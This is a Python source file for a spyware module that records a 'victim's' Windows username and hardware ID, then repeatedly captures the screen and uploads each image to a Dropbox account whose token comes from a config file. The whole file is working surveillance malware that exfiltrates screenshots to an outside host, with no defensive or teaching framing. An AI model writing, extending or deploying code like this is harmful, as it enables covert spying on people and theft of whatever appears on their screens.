import os
import sys
import subprocess
import dropbox
from time import time, sleep
from PIL import Image, ImageGrab
from threading import Timer
from io import BytesIO
# https://stackoverflow.com/questions/31409506/python-convert-from-png-to-jpg-without-saving-file-to-disk-using-pil


class DropboxScreenshotter:

    def __init__(self, config):
        self.config = config
        self.exit_flag_raised = False
        self._victim_username = os.getlogin()
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)

    def _screenshot_worker(self) -> None:
        # currently supports formats "JPEG" & "PNG" only
        format_to_ext = {
            'JPEG': '.jpg',
            'PNG': '.png'
        }
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        while not self.exit_flag_raised:
            output_filename = \
                str(round(time() * 1000)) + format_to_ext[self.config['image_format']]
            dropbox_filepath = \
                (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
            im: Image = ImageGrab.grab()
            with BytesIO() as f:
                im.save(f, format=self.config['image_format'])
                dbx.files_upload(f.getvalue(), dropbox_filepath)
            sleep(self.config['screenshot_interval_ms']/1000)

    def run(self) -> None:
        def _raise_exit_flag():
            nonlocal self
            self.exit_flag_raised = True
        Timer(self.config['max_runtime_ms']/1000, _raise_exit_flag)
        self._screenshot_worker()